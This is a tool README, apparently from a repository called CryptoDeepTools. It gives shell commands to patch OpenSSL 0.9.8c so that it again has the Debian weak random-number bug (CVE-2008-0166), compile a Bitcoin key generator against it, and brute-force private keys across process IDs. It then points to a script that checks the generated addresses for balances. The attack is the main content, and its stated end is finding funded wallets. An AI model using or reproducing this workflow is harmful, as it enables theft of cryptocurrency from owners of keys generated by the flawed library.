# Vulnerable to Debian OpenSSL bug (CVE-2008-0166)

---

* Tutorial: https://youtu.be/zHkXups2I8k
* Tutorial: https://cryptodeep.ru/vulnerable-openssl

---

# Commands:

    git clone https://github.com/demining/CryptoDeepTools.git

    cd CryptoDeepTools/05VulnerableOpenSSL/

    apt-get update

    sudo apt-get install g++ -y

    sudo apt-get install libgmp3-dev libmpfr-dev -y

    wget https://ftp.openssl.org/source/old/0.9.x/openssl-0.9.8c.tar.gz

    tar xfz openssl-0.9.8c.tar.gz

    mv openssl-0.9.8c openssl-0.9.8c-vuln

    cd openssl-0.9.8c-vuln

    ls -lh

    patch -p1 <../make-OpenSSL-0-9-8c-vulnerable-again.diff

    ./Configure linux-x86_64 shared no-ssl2 no-ssl3 no-comp no-asm

    make depend all

    cd /

    ls

    cd content/CryptoDeepTools/05VulnerableOpenSSL/

    ls -lh


# Compilation:

    gcc -o cryptodeepbtcgen cryptodeepbtc.c -I./openssl-0.9.8c-vuln/include -L./openssl-0.9.8c-vuln -lssl -lcrypto

    ls -lh


RUN:

    LD_LIBRARY_PATH=./openssl-0.9.8c-vuln/ ./cryptodeepbtcgen -h


Version 0.1.2 (le64)

Usage:

-p n-m		Brute Force between PID n-m [default 0-32768]

-n <num>	Create num number of keys per PID [default: 10]

-l		Show all supported BTC versions

-v <prog>	Which BTC version to run (Try -l to find number) [0-43]

-x		Skip Self-Check



    LD_LIBRARY_PATH=./openssl-0.9.8c-vuln/ ./cryptodeepbtcgen -l



#0   - 0.3.24

#1   - 0.8.6-d

#2   - 0.8.6-qt

#3   - 0.9.1-d

#4   - 0.9.4-d

#5   - unknownA

#6   - unknownB

#7   - unknownC

e.t.c
e.t.c


    LD_LIBRARY_PATH=./openssl-0.9.8c-vuln/ ./cryptodeepbtcgen -n 32 -v 0 >> result.txt


Next, it remains to check all the generated Bitcoin Addresses for the presence of BTC coins, for this we can use a python script:  [bitcoin-checker.py](https://github.com/demining/CryptoDeepTools/blob/main/03CheckBitcoinAddressBalance/bitcoin-checker.py)


---

* Tutorial: https://youtu.be/zHkXups2I8k
* Tutorial: https://cryptodeep.ru/vulnerable-openssl

---







|  | Donation Address |
| --- | --- |
| ♥ __BTC__ | 1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v |
| ♥ __ETH__ | 0xaBd66CF90898517573f19184b3297d651f7b90bf |
